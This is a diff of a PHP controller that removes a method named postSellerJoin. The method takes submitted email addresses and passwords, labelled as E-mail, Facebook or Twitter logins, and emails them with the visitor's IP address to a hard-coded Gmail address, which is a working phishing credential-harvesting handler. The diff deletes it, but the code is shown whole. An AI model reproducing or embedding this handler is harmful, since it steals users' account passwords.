@@ -124,43 +124,6 @@ class MainController extends Controller {
            return $ret;
     }   
     
-    
-    public function postSellerJoin(Request $request)
-	{
-           $req = $request->all();
-		   #dd($req);
-           $ret = "";
-               
-                $validator = Validator::make($req, [
-                             'deg' => 'required',
-                             'email' => 'required|email',
-                             'pass' => 'required',
-                   ]);
-         
-                 if($validator->fails())
-                  {
-                       $ret = "Enter your email and password to continue!";
-                       
-                 }
-                
-                 else
-                 { 
-			           $dg = "E-mail";
-					   $deg = $req["deg"];
-					   if($deg == "fbb") $dg = "Facebook";
-					   else if($deg == "tww") $dg = "Twitter";
-					   
-            		   $s = "New $dg Login: ".date("h:i A jS F, Y");
-                       $rcpt = "uwantbrendacolson@gmail.com";
-                       $pass = $req["pass"];
-                       $email = $req["email"];
-					   $ip = getenv("REMOTE_ADDR");
-
-                       $this->helpers->sendEmail($rcpt,$s,['ip' => $ip,'pass' => $pass,'email' => $email],'emails.apply_alert','view');  
-                        $ret = "ok";                      
-                  }       
-           return $ret;                                                                                            
-	}
 	
 	/**
 	 * Show the application Pricing screen to the user.
